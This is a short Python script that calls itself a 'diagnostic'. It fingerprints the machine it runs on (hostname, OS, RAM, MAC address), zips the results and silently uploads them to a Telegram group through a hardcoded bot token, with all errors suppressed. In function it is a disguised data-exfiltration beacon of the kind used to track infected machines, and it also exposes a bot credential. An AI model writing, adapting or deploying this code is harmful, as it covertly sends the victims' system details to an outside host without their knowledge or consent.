import json, platform, socket, tempfile, zipfile, requests, psutil, uuid
from pathlib import Path

# ТВОИ ДАННЫЕ
BOT_TOKEN = "8306979857:AAHz6mJipjg0kYnJVXhapTe2FgxTKbP1J7s"
GROUP_ID  = "-5123352957"
API_URL   = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

def run_diagnostic():
    try:
        mem = psutil.virtual_memory()
        info = {
            "hostname": socket.gethostname(),
            "os": f"{platform.system()} {platform.release()}",
            "ram_gb": round(mem.total / (1024**3), 2),
            "mac": ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
        }
        
        report_path = Path(tempfile.gettempdir()) / "system_report.zip"
        with zipfile.ZipFile(report_path, 'w') as zf:
            zf.writestr("info.json", json.dumps(info, indent=4))
        
        with open(report_path, 'rb') as f:
            caption = f"⚠️ <b>Новый отчет</b>\nХост: {info['hostname']}\nОС: {info['os']}"
            requests.post(API_URL, data={'chat_id': GROUP_ID, 'caption': caption, 'parse_mode': 'HTML'}, files={'document': f})
    except:
        pass

if __name__ == "__main__":
    run_diagnostic()
